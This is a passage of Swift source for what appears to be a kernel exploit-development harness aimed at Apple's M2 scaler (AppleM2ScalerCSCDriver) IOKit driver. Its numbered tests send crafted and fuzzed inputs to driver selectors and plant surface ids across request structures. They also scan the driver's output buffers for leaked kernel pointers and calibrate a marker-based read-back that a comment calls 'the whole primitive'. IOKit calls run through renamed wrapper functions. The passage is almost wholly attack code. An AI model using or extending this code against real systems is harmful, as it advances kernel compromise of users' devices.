            benchLine("[NO] service not found"); return
        }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else {
            benchLine("[NO] lookup failed"); return
        }
        let svc = xq_IOIteratorNext(it)
        xq_IOObjectRelease(it)
        guard svc != 0 else { benchLine("[NO] no service"); return }
        defer { xq_IOObjectRelease(svc) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case 1: return "INVALID_ADDRESS"
            case -536870206: return "BadArgument"
            case -536870201: return "Unsupported"
            case -536870209: return "IPCError"
            case -536870211: return "NoMemory"
            case -536870174: return "NotPermitted"
            case -536870160: return "NotReady"
            default: return "kr=\(kr)"
            }
        }

        func make(_ u32: [UInt32], size: Int) -> [UInt8] {
            var b: [UInt8] = []
            for v in u32 { b.append(contentsOf: withUnsafeBytes(of: v.littleEndian, Array.init)) }
            while b.count < size { b.append(0) }
            return Array(b.prefix(size))
        }

        let patterns: [(String, [UInt8])] = [
            ("zeros", make([0, 0, 0, 0, 0, 0], size: 0x18)),
            ("1 in word0", make([1, 0, 0, 0, 0, 0], size: 0x18)),
            ("1 in word1", make([0, 1, 0, 0, 0, 0], size: 0x18)),
            ("0x1000 in word0", make([0x1000, 0, 0, 0, 0, 0], size: 0x18)),
            ("0xffffffff in word0", make([0xffffffff, 0, 0, 0, 0, 0], size: 0x18)),
            ("0xffffffff everywhere", make([0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff], size: 0x18)),
        ]

        for (label, bytes) in patterns {
            var conn: io_connect_t = 0
            guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else {
                benchLine("     \(label): open failed"); continue
            }
            defer { xq_IOServiceClose(conn) }

            func call(_ sel: UInt32, _ input: [UInt8]) -> kern_return_t {
                var buf = input.isEmpty ? [UInt8](repeating: 0, count: 1) : input
                var outScalars = [UInt64](repeating: 0, count: 8)
                var scount: UInt32 = 8
                var osz = 0
                var kr: kern_return_t = -1
                buf.withUnsafeBytes { ib in
                    outScalars.withUnsafeMutableBufferPointer { sop in
                        kr = xq_IOConnectCallMethod(conn, sel, nil, 0,
                                                    input.isEmpty ? nil : ib.baseAddress, input.count,
                                                    sop.baseAddress, &scount, nil, &osz)
                    }
                }
                return kr
            }

            let r10 = call(10, bytes)
            let r1 = call(1, [UInt8](repeating: 0, count: 0x1b0))
            let r9 = call(9, [UInt8](repeating: 0, count: 0x10))
            let r11 = call(11, bytes)
            benchLine("     \(label): sel10=\(name(r10)) ?? sel1=\(name(r1)) ?? sel9=\(name(r9)) ?? sel11=\(name(r11))")
        }

        benchLine("     a marker that changes sel1 or sel9 is worth following")
        benchLine("??? done")
    }

    // MARK: - test 26: find every scaler-like service

    /// The accelerator work showed the registry can be asked for class names.
    /// This walks every IOService and reports the ones whose class looks like a
    /// scaler, framebuffer or graphics service, then tries to open each.
    func bench26ScalerInventory() {
        benchLine("??? 26 ?? scaler inventory")
        benchLine("     scanning the registry for Scaler / CSC / Framebuffer / Graphics classes")

        guard let all = "IOService".withCString({ xq_IOServiceMatching($0) }) else {
            benchLine("[NO] registry query failed"); return
        }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, all, &it) == KERN_SUCCESS else {
            benchLine("[NO] registry walk failed"); return
        }

        var classes: [String: Int] = [:]
        while true {
            let obj = xq_IOIteratorNext(it)
            if obj == 0 { break }
            var buf = [CChar](repeating: 0, count: 128)
            if xq_IOObjectGetClass(obj, &buf) == KERN_SUCCESS {
                let cls = String(cString: buf)
                let lower = cls.lowercased()
                if lower.contains("scaler") || lower.contains("csc")
                    || lower.contains("framebuffer") || lower.contains("graphics")
                    || lower.contains("clcd") || lower.contains("dcp") {
                    classes[cls, default: 0] += 1
                }
            }
            xq_IOObjectRelease(obj)
        }
        xq_IOObjectRelease(it)

        guard !classes.isEmpty else {
            benchLine("[NO] no matching class in the registry"); return
        }
        benchLine("     \(classes.count) class(es):")
        for (cls, count) in classes.sorted(by: { $0.key < $1.key }) {
            benchLine("          \(cls) ?? \(count)")
        }

        // Try to open every class that mentions scaler or CSC.
        let interesting = classes.keys.filter {
            let l = $0.lowercased()
            return l.contains("scaler") || l.contains("csc")
        }.sorted()
        for cls in interesting {
            guard let m = cls.withCString({ xq_IOServiceMatching($0) }) else { continue }
            var sit: io_iterator_t = 0
            guard xq_IOServiceGetMatchingServices(0, m, &sit) == KERN_SUCCESS else { continue }
            let svc = xq_IOIteratorNext(sit)
            xq_IOObjectRelease(sit)
            guard svc != 0 else { continue }
            var opened: [String] = []
            for type in UInt32(0)...3 {
                var conn: io_connect_t = 0
                let kr = xq_IOServiceOpen(svc, mach_task_self_, type, &conn)
                if kr == 0 {
                    opened.append("type \(type)")
                    xq_IOServiceClose(conn)
                }
            }
            xq_IOObjectRelease(svc)
            benchLine("     \(cls): \(opened.isEmpty ? "no type opened" : opened.joined(separator: ", "))")
        }

        benchLine("??? done")
    }

    // MARK: - test 27: notification port before the async method

    /// sel 1 is the asynchronous submission path and answers NotReady. A client
    /// that never set a notification port cannot report completion, which is one
    /// plausible reading of NotReady. This sets the port first and retries.
    func bench27ScalerNotify() {
        benchLine("??? 27 ?? scaler notification port")
        benchLine("     NotReady may mean no completion port was set")

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else {
            benchLine("[NO] service not found"); return
        }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else {
            benchLine("[NO] lookup failed"); return
        }
        let svc = xq_IOIteratorNext(it)
        xq_IOObjectRelease(it)
        guard svc != 0 else { benchLine("[NO] no service"); return }
        defer { xq_IOObjectRelease(svc) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case 1: return "INVALID_ADDRESS"
            case -536870206: return "BadArgument"
            case -536870201: return "Unsupported"
            case -536870211: return "NoMemory"
            case -536870174: return "NotPermitted"
            case -536870160: return "NotReady"
            default: return "kr=\(kr)"
            }
        }

        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else {
            benchLine("[NO] open failed"); return
        }
        defer { xq_IOServiceClose(conn) }

        // A receive port for async completions.
        var port: mach_port_t = 0
        let pkr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &port)
        benchLine("     mach_port_allocate: \(pkr == 0 ? "port \(port)" : "failed \(pkr)")")

        func submit() -> kern_return_t {
            var input = [UInt8](repeating: 0, count: 0x1b0)
            var osz = 0
            var kr: kern_return_t = -1
            input.withUnsafeBytes { ib in
                kr = xq_IOConnectCallMethod(conn, 1, nil, 0, ib.baseAddress, 0x1b0,
                                            nil, nil, nil, &osz)
            }
            return kr
        }

        let before = submit()
        benchLine("     sel 1 before any port: \(name(before))")

        if port != 0 {
            for type in UInt32(0)...2 {
                let skr = xq_IOConnectSetNotificationPort(conn, type, port, 0)
                let after = submit()
                benchLine("     type \(type) port set (\(skr == 0 ? "ok" : String(skr))) ?? sel 1: \(name(after))")
            }
            mach_port_destroy(mach_task_self_, port)
        }

        benchLine("     if sel 1 leaves NotReady, the async path is reachable")
        benchLine("??? done")
    }

    // MARK: - test 28: async call variant

    /// Setting the notification port did not change NotReady. The remaining
    /// difference is the call itself: sel 1 is asynchronous, and it may require
    /// IOConnectCallAsyncMethod with a reference instead of the synchronous one.
    func bench28ScalerAsync() {
        benchLine("??? 28 ?? scaler async call")
        benchLine("     sel 1 through IOConnectCallAsyncMethod")

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else {
            benchLine("[NO] service not found"); return
        }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else {
            benchLine("[NO] lookup failed"); return
        }
        let svc = xq_IOIteratorNext(it)
        xq_IOObjectRelease(it)
        guard svc != 0 else { benchLine("[NO] no service"); return }
        defer { xq_IOObjectRelease(svc) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case 1: return "INVALID_ADDRESS"
            case -536870206: return "BadArgument"
            case -536870201: return "Unsupported"
            case -536870211: return "NoMemory"
            case -536870174: return "NotPermitted"
            case -536870160: return "NotReady"
            case -536870212: return "IOReturnError"
            default: return "kr=\(kr)"
            }
        }

        var port: mach_port_t = 0
        let pkr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &port)
        benchLine("     port: \(pkr == 0 ? "\(port)" : "allocate failed \(pkr)")")
        defer { if port != 0 { mach_port_destroy(mach_task_self_, port) } }

        for type in UInt32(0)...1 {
            var conn: io_connect_t = 0
            guard xq_IOServiceOpen(svc, mach_task_self_, type, &conn) == KERN_SUCCESS else { continue }
            _ = xq_IOConnectSetNotificationPort(conn, 0, port, 0)

            var input = [UInt8](repeating: 0, count: 0x1b0)
            var reference: UInt64 = 0xa1b2c3d4
            var outScalars = [UInt64](repeating: 0, count: 8)
            var scount: UInt32 = 8
            var osz = 0
            var kr: kern_return_t = -1
            input.withUnsafeBytes { ib in
                outScalars.withUnsafeMutableBufferPointer { sop in
                    kr = xq_IOConnectCallAsyncMethod(conn, 1, port, &reference, 1,
                                                     nil, 0,
                                                     ib.baseAddress, 0x1b0,
                                                     sop.baseAddress, &scount,
                                                     nil, &osz)
                }
            }
            benchLine("     type \(type) ?? async sel 1: \(name(kr)) ref=0x\(String(reference, radix: 16))")
            xq_IOServiceClose(conn)
        }

        // Baseline with the synchronous call on a fresh connection.
        var conn: io_connect_t = 0
        if xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS {
            var input = [UInt8](repeating: 0, count: 0x1b0)
            var osz = 0
            var kr: kern_return_t = -1
            input.withUnsafeBytes { ib in
                kr = xq_IOConnectCallMethod(conn, 1, nil, 0, ib.baseAddress, 0x1b0, nil, nil, nil, &osz)
            }
            benchLine("     sync baseline: \(name(kr))")
            xq_IOServiceClose(conn)
        }

        benchLine("     an async call that is not NotReady means the path is open")
        benchLine("??? done")
    }

    // MARK: - test 29: surface reference inside the sel 1 structure

    /// sel 1 is synchronous and answers NotReady. A request for the scaler most
    /// likely names an IOSurface, so this places a real surface id at every
    /// 8-byte offset of the 0x1b0 structure and reports the first position where
    /// the answer stops being NotReady.
    func bench29ScalerSurfaceField() {
        benchLine("??? 29 ?? scaler surface field")
        benchLine("     placing a real surface id at each 8-byte offset of the 0x1b0 request")

        guard let made = benchMakeSurface(headerPerSlice: 0x40000000) else {
            benchLine("[NO] could not create the surface"); return
        }
        let (sid, surfaceRef) = made
        defer { _ = surfaceRef }
        benchLine("     surface id \(sid) ?? alloc 0x\(String(IOSurfaceGetAllocSize(surfaceRef), radix: 16))")

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else {
            benchLine("[NO] scaler not found"); return
        }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it)
        xq_IOObjectRelease(it)
        guard svc != 0 else { benchLine("[NO] no service"); return }
        defer { xq_IOObjectRelease(svc) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case 1: return "INVALID_ADDRESS"
            case -536870206: return "BadArgument"
            case -536870201: return "Unsupported"
            case -536870211: return "NoMemory"
            case -536870174: return "NotPermitted"
            case -536870160: return "NotReady"
            default: return "kr=\(kr)"
            }
        }

        var changed = 0
        for offset in stride(from: 0, to: 0x1b0, by: 8) {
            var conn: io_connect_t = 0
            guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { continue }
            var input = [UInt8](repeating: 0, count: 0x1b0)
            let value = UInt64(sid)
            withUnsafeBytes(of: value.littleEndian) { raw in
                for (i, b) in raw.enumerated() where offset + i < input.count {
                    input[offset + i] = b
                }
            }
            var osz = 0
            var kr: kern_return_t = -1
            input.withUnsafeBytes { ib in
                kr = xq_IOConnectCallMethod(conn, 1, nil, 0, ib.baseAddress, 0x1b0, nil, nil, nil, &osz)
            }
            xq_IOServiceClose(conn)
            if kr != -536870160 {
                benchLine("     offset 0x\(String(offset, radix: 16)) ?? \(name(kr))")
                changed += 1
            }
        }

        benchLine(changed == 0
                  ? "[NO] every offset still answers NotReady ??? the id alone does not satisfy it"
                  : "[OK] \(changed) offset(s) changed the answer")
        benchLine("??? done")
    }

    // MARK: - test 30: read the scaler output buffer

    /// Selector 11 answers ok for any input, but the answer includes up to 664
    /// bytes of output. Those bytes were never inspected. This dumps the head and
    /// scans for kernel pointers.
    func bench30ScalerReadBack() {
        benchLine("??? 30 ?? scaler read-back")
        benchLine("     sel 11 ?? inspecting the 664-byte output")

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else {
            benchLine("[NO] service not found"); return
        }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else {
            benchLine("[NO] lookup failed"); return
        }
        let svc = xq_IOIteratorNext(it)
        xq_IOObjectRelease(it)
        guard svc != 0 else { benchLine("[NO] no service"); return }
        defer { xq_IOObjectRelease(svc) }

        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else {
            benchLine("[NO] open failed"); return
        }
        defer { xq_IOServiceClose(conn) }

        let maxSize = 0x400
        var out = [UInt8](repeating: 0, count: maxSize)
        var outSize = maxSize
        var scalars = [UInt64](repeating: 0, count: 16)
        var scount: UInt32 = 16
        var kr: kern_return_t = -1
        out.withUnsafeMutableBytes { ob in
            scalars.withUnsafeMutableBufferPointer { sop in
                kr = xq_IOConnectCallMethod(conn, 11, nil, 0, nil, 0,
                                            sop.baseAddress, &scount,
                                            ob.baseAddress, &outSize)
            }
        }
        benchLine("     sel 11 kr=\(kr) outSize=\(outSize)")

        if kr == 0 && outSize > 0 {
            // Head dump, 8 bytes per line.
            var off = 0
            while off < min(outSize, 0x40) {
                var word: UInt64 = 0
                for i in 0..<8 where off + i < outSize {
                    word |= UInt64(out[off + i]) << (8 * i)
                }
                benchLine("     +0x\(String(format: "%03x", off)): 0x\(String(format: "%016llx", word))")
                off += 8
            }

            // Kernel pointer scan across the whole buffer.
            var hits: [(Int, UInt64)] = []
            var p = 0
            while p + 8 <= outSize {
                var v: UInt64 = 0
                for i in 0..<8 { v |= UInt64(out[p + i]) << (8 * i) }
                if v >= 0xFFFF_8000_0000_0000 && v < 0xFFFF_FFFF_0000_0000 {
                    hits.append((p, v))
                }
                p += 8
            }
            benchLine("     kernel pointers: \(hits.count)")
            for (o, v) in hits.prefix(10) {
                benchLine("          +0x\(String(format: "%03x", o)): 0x\(String(format: "%016llx", v))")
            }
            if hits.isEmpty {
                benchLine("     buffer holds no kernel-range values")
            }
        }

        benchLine("??? done")
    }

    // MARK: - test 31: warm the scaler, then transform and read back

    /// The missing piece from the reference implementation: the scaler context is
    /// created by VTPixelTransfer warm-up runs, not by an IOKit call. This warms
    /// it, then submits a transform with a real surface pair and reads back.
    func bench31ScalerWarm() {
        benchLine("??? 31 ?? scaler warm-up + transform")
        benchLine("     VTPixelTransfer first, then sel 1 with a real surface pair")

        // 1. Warm up through VTPixelTransfer.
        var session: VTPixelTransferSession?
        let st = VTPixelTransferSessionCreate(allocator: kCFAllocatorDefault,
                                              pixelTransferSessionOut: &session)
        benchLine("     VTPixelTransferSessionCreate \(st)")
        if let session {
            let attrs: [CFString: Any] = [kCVPixelBufferIOSurfacePropertiesKey: [:] as CFDictionary]
            var ok = 0
            for i in 0..<8 {
                let w = 64 + i * 32, h = 64 + i * 16
                var src: CVPixelBuffer?, dst: CVPixelBuffer?
                CVPixelBufferCreate(kCFAllocatorDefault, w, h, kCVPixelFormatType_32BGRA,
                                    attrs as CFDictionary, &src)
                CVPixelBufferCreate(kCFAllocatorDefault, w, h,
                                    kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                    attrs as CFDictionary, &dst)
                guard let s = src, let d = dst else { continue }
                CVPixelBufferLockBaseAddress(s, [])
                if let base = CVPixelBufferGetBaseAddress(s) {
                    memset(base, Int32(0xA0 + i), CVPixelBufferGetBytesPerRow(s) * h)
                }
                CVPixelBufferUnlockBaseAddress(s, [])
                if VTPixelTransferSessionTransferImage(session, from: s, to: d) == noErr { ok += 1 }
            }
            benchLine("     warm-up \(ok)/8")
            VTPixelTransferSessionInvalidate(session)
        }

        // 2. Surface pair, the way the reference does it.
        let bgra: [IOSurfacePropertyKey: Any] = [
            .width: 64, .height: 64,
            .pixelFormat: kCVPixelFormatType_32BGRA,
            .bytesPerElement: 4, .bytesPerRow: 256, .allocSize: 64 * 64 * 4,
        ]
        let yuv: [IOSurfacePropertyKey: Any] = [
            .width: 64, .height: 64,
            .pixelFormat: kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
            .bytesPerElement: 1, .bytesPerRow: 64, .allocSize: 64 * 64 * 3 / 2,
        ]
        guard let src = IOSurfaceCreate(bgra as CFDictionary),
              let dst = IOSurfaceCreate(yuv as CFDictionary) else {
            benchLine("[NO] IOSurfaceCreate failed"); return
        }
        defer { _ = src; _ = dst }
        let srcID = IOSurfaceGetID(src)
        let dstID = IOSurfaceGetID(dst)
        benchLine("     surfaces src=\(srcID) dst=\(dstID)")

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else {
            benchLine("[NO] scaler not found"); return
        }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it)
        xq_IOObjectRelease(it)
        guard svc != 0 else { benchLine("[NO] no service"); return }
        defer { xq_IOObjectRelease(svc) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case 1: return "INVALID_ADDRESS"
            case -536870206: return "BadArgument"
            case -536870201: return "Unsupported"
            case -536870211: return "NoMemory"
            case -536870174: return "NotPermitted"
            case -536870160: return "NotReady"
            default: return "kr=\(kr)"
            }
        }

        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else {
            benchLine("[NO] open failed"); return
        }
        defer { xq_IOServiceClose(conn) }

        var input = [UInt8](repeating: 0, count: 0x1b0)
        withUnsafeBytes(of: srcID.littleEndian) { raw in
            for (i, b) in raw.enumerated() { input[i] = b }
        }
        withUnsafeBytes(of: dstID.littleEndian) { raw in
            for (i, b) in raw.enumerated() { input[4 + i] = b }
        }

        // struct-only
        var k1: kern_return_t = -1
        var dummySize = 0
        input.withUnsafeBytes { ib in
            k1 = xq_IOConnectCallMethod(conn, 1, nil, 0, ib.baseAddress, 0x1b0, nil, nil, nil, &dummySize)
        }
        benchLine("     sel 1 struct-only: \(name(k1))")

        // three scalars plus struct
        var sc: [UInt64] = [UInt64(srcID), UInt64(dstID), 0]
        var k2: kern_return_t = -1
        input.withUnsafeBytes { ib in
            k2 = xq_IOConnectCallMethod(conn, 1, &sc, 3, ib.baseAddress, 0x1b0, nil, nil, nil, &dummySize)
        }
        benchLine("     sel 1 with 3 scalars: \(name(k2))")

        // read back
        var out = [UInt8](repeating: 0, count: 0x400)
        var outSize = 0x400
        var scount: UInt32 = 16
        var sOut = [UInt64](repeating: 0, count: 16)
        var k3: kern_return_t = -1
        out.withUnsafeMutableBytes { ob in
            sOut.withUnsafeMutableBufferPointer { sop in
                k3 = xq_IOConnectCallMethod(conn, 11, nil, 0, nil, 0,
                                            sop.baseAddress, &scount,
                                            ob.baseAddress, &outSize)
            }
        }
        benchLine("     sel 11: \(name(k3)) outSize=\(outSize)")

        if k3 == 0 && outSize > 0 {
            var hits = 0
            var p = 0
            while p + 8 <= outSize {
                var v: UInt64 = 0
                for i in 0..<8 { v |= UInt64(out[p + i]) << (8 * i) }
                if v >= 0xFFFF_8000_0000_0000 && v < 0xFFFF_FFFF_0000_0000 {
                    if hits < 6 {
                        benchLine("          kptr +0x\(String(format: "%03x", p)): 0x\(String(format: "%016llx", v))")
                    }
                    hits += 1
                }
                p += 8
            }
            benchLine("     kernel pointers in the buffer: \(hits)")
        }

        benchLine("??? done")
    }

    // MARK: - test 32: calibrate the read-back offset

    /// With the context alive after warm-up, property + transform + read-back is
    /// the whole primitive. This writes a known marker through the property call
    /// and finds where it appears in the read-back buffer.
    func bench32ScalerCalibrate() {
        benchLine("??? 32 ?? scaler calibration")
        benchLine("     marker through the property call, then find it in the read-back")

        // Warm up so sel 1 stops answering NotReady.
        var session: VTPixelTransferSession?
        if VTPixelTransferSessionCreate(allocator: kCFAllocatorDefault,
                                        pixelTransferSessionOut: &session) == noErr, let session {
            let attrs: [CFString: Any] = [kCVPixelBufferIOSurfacePropertiesKey: [:] as CFDictionary]
            for i in 0..<8 {
                let w = 64 + i * 32, h = 64 + i * 16
                var src: CVPixelBuffer?, dst: CVPixelBuffer?
                CVPixelBufferCreate(kCFAllocatorDefault, w, h, kCVPixelFormatType_32BGRA,
                                    attrs as CFDictionary, &src)
                CVPixelBufferCreate(kCFAllocatorDefault, w, h,
                                    kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                    attrs as CFDictionary, &dst)
                if let s = src, let d = dst {
                    _ = VTPixelTransferSessionTransferImage(session, from: s, to: d)
                }
            }
            VTPixelTransferSessionInvalidate(session)
            benchLine("     warm-up done")
        }

        let bgra: [IOSurfacePropertyKey: Any] = [
            .width: 64, .height: 64, .pixelFormat: kCVPixelFormatType_32BGRA,
            .bytesPerElement: 4, .bytesPerRow: 256, .allocSize: 64 * 64 * 4,
        ]
        let yuv: [IOSurfacePropertyKey: Any] = [
            .width: 64, .height: 64,
            .pixelFormat: kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
            .bytesPerElement: 1, .bytesPerRow: 64, .allocSize: 64 * 64 * 3 / 2,
        ]
        guard let src = IOSurfaceCreate(bgra as CFDictionary),
              let dst = IOSurfaceCreate(yuv as CFDictionary) else {
            benchLine("[NO] surfaces"); return
        }
        defer { _ = src; _ = dst }
        let srcID = IOSurfaceGetID(src), dstID = IOSurfaceGetID(dst)

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        guard svc != 0 else { return }
        defer { xq_IOObjectRelease(svc) }

        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { return }
        defer { xq_IOServiceClose(conn) }

        func readBack() -> [UInt8] {
            var out = [UInt8](repeating: 0, count: 0x400)
            var size = 0x400
            var scount: UInt32 = 16
            var sOut = [UInt64](repeating: 0, count: 16)
            var kr: kern_return_t = -1
            out.withUnsafeMutableBytes { ob in
                sOut.withUnsafeMutableBufferPointer { sop in
                    kr = xq_IOConnectCallMethod(conn, 11, nil, 0, nil, 0,
                                                sop.baseAddress, &scount, ob.baseAddress, &size)
                }
            }
            return kr == 0 ? Array(out.prefix(size)) : []
        }

        func setProperty(_ type: UInt32, _ payload: UInt64) -> kern_return_t {
            var input = [UInt8](repeating: 0, count: 0x18)
            withUnsafeBytes(of: type.littleEndian) { raw in
                for (i, b) in raw.enumerated() { input[i] = b }
            }
            withUnsafeBytes(of: payload.littleEndian) { raw in
                for (i, b) in raw.enumerated() { input[8 + i] = b }
            }
            var dsz = 0
            var kr: kern_return_t = -1
            input.withUnsafeBytes { ib in
                kr = xq_IOConnectCallMethod(conn, 10, nil, 0, ib.baseAddress, 0x18,
                                            nil, nil, nil, &dsz)
            }
            return kr
        }

        func transform() -> kern_return_t {
            var input = [UInt8](repeating: 0, count: 0x1b0)
            withUnsafeBytes(of: srcID.littleEndian) { raw in
                for (i, b) in raw.enumerated() { input[i] = b }
            }
            withUnsafeBytes(of: dstID.littleEndian) { raw in
                for (i, b) in raw.enumerated() { input[4 + i] = b }
            }
            var dsz = 0
            var kr: kern_return_t = -1
            input.withUnsafeBytes { ib in
                kr = xq_IOConnectCallMethod(conn, 1, nil, 0, ib.baseAddress, 0x1b0,
                                            nil, nil, nil, &dsz)
            }
            return kr
        }

        let baseline = readBack()
        benchLine("     baseline \(baseline.count) bytes")

        let marker: UInt64 = 0xDEAD_CAFE_BEEF_1337
        var found = false
        for type in UInt32(0)...3 {
            let pk = setProperty(type, marker)
            let tk = transform()
            let after = readBack()
            guard !after.isEmpty else { continue }

            var offsets: [Int] = []
            var p = 0
            while p + 8 <= after.count {
                var v: UInt64 = 0
                for i in 0..<8 { v |= UInt64(after[p + i]) << (8 * i) }
                if v == marker { offsets.append(p) }
                p += 8
            }
            var changed = 0
            for i in 0..<min(baseline.count, after.count) where baseline[i] != after[i] { changed += 1 }
            benchLine("     type \(type): set=\(pk) transform=\(tk) ?? marker at \(offsets.map { "0x" + String($0, radix: 16) }.joined(separator: ",")) ?? \(changed) byte(s) differ")
            if !offsets.isEmpty { found = true }
        }

        benchLine(found
                  ? "[OK] the marker reaches the read-back buffer ??? property is reflected"
                  : "[NO] marker never appears ?? the property path is not reflected back")
        benchLine("??? done")
    }

    // MARK: - test 33: documented ABI, then ring setup before the transform

    /// The reference table gives a scalar count for every selector. This calls
    /// each entry with its documented shape, then runs ring setup before the
    /// property/transform/read-back sequence, which the earlier tests never did.
    func bench33ScalerRing() {
        benchLine("??? 33 ?? scaler documented ABI + ring setup")

        // Warm up first: without it sel 1 answers NotReady.
        var session: VTPixelTransferSession?
        if VTPixelTransferSessionCreate(allocator: kCFAllocatorDefault,
                                        pixelTransferSessionOut: &session) == noErr, let session {
            let attrs: [CFString: Any] = [kCVPixelBufferIOSurfacePropertiesKey: [:] as CFDictionary]
            for i in 0..<8 {
                let w = 64 + i * 32, h = 64 + i * 16
                var s: CVPixelBuffer?, d: CVPixelBuffer?
                CVPixelBufferCreate(kCFAllocatorDefault, w, h, kCVPixelFormatType_32BGRA,
                                    attrs as CFDictionary, &s)
                CVPixelBufferCreate(kCFAllocatorDefault, w, h,
                                    kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                    attrs as CFDictionary, &d)
                if let s, let d { _ = VTPixelTransferSessionTransferImage(session, from: s, to: d) }
            }
            VTPixelTransferSessionInvalidate(session)
        }

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        guard svc != 0 else { return }
        defer { xq_IOObjectRelease(svc) }

        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { return }
        defer { xq_IOServiceClose(conn) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case 1: return "INVAL_ADDR"
            case -536870206: return "BadArgument"
            case -536870201: return "Unsupported"
            case -536870211: return "NoMemory"
            case -536870174: return "NotPermitted"
            case -536870160: return "NotReady"
            default: return "kr=\(kr)"
            }
        }

        func call(_ sel: UInt32, _ scalars: [UInt64], _ structSize: Int) -> kern_return_t {
            var input = [UInt8](repeating: 0, count: max(structSize, 1))
            var sc = scalars.isEmpty ? [UInt64](repeating: 0, count: 1) : scalars
            var dsz = 0
            var kr: kern_return_t = -1
            input.withUnsafeBytes { ib in
                sc.withUnsafeMutableBufferPointer { sb in
                    kr = xq_IOConnectCallMethod(conn, sel,
                                                scalars.isEmpty ? nil : sb.baseAddress, UInt32(scalars.count),
                                                structSize == 0 ? nil : ib.baseAddress, structSize,
                                                nil, nil, nil, &dsz)
                }
            }
            return kr
        }

        // Documented table, shifted by one to match this build.
        let table: [(String, UInt32, Int, Int)] = [
            ("transform", 1, 3, 0x1b0),
            ("ring setup", 4, 3, 0x20),
            ("LUT upload", 6, 3, 0xfa8),
            ("param A", 7, 3, 0x8),
            ("param B", 8, 3, 0x8),
            ("param C", 9, 3, 0x10),
            ("set property", 10, 3, 0x18),
            ("read back", 11, 2, 0),
        ]
        for (label, sel, sc, size) in table {
            let kr = call(sel, [UInt64](repeating: 0, count: sc), size)
            benchLine("     \(label) ?? sel \(sel) sc\(sc) 0x\(String(size, radix: 16)): \(name(kr))")
        }

        // Ring setup, then property, transform and read-back.
        let ring = call(4, [1, 0, 0], 0x20)
        benchLine("     ring setup with scalars: \(name(ring))")

        let bgra: [IOSurfacePropertyKey: Any] = [
            .width: 64, .height: 64, .pixelFormat: kCVPixelFormatType_32BGRA,
            .bytesPerElement: 4, .bytesPerRow: 256, .allocSize: 64 * 64 * 4,
        ]
        let yuv: [IOSurfacePropertyKey: Any] = [
            .width: 64, .height: 64,
            .pixelFormat: kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
            .bytesPerElement: 1, .bytesPerRow: 64, .allocSize: 64 * 64 * 3 / 2,
        ]
        guard let srcS = IOSurfaceCreate(bgra as CFDictionary),
              let dstS = IOSurfaceCreate(yuv as CFDictionary) else {
            benchLine("[NO] surfaces"); return
        }
        defer { _ = srcS; _ = dstS }
        let srcID = IOSurfaceGetID(srcS), dstID = IOSurfaceGetID(dstS)

        func readBack() -> [UInt8] {
            var out = [UInt8](repeating: 0, count: 0x400)
            var size = 0x400
            var scount: UInt32 = 16
            var sOut = [UInt64](repeating: 0, count: 16)
            var kr: kern_return_t = -1
            out.withUnsafeMutableBytes { ob in
                sOut.withUnsafeMutableBufferPointer { sop in
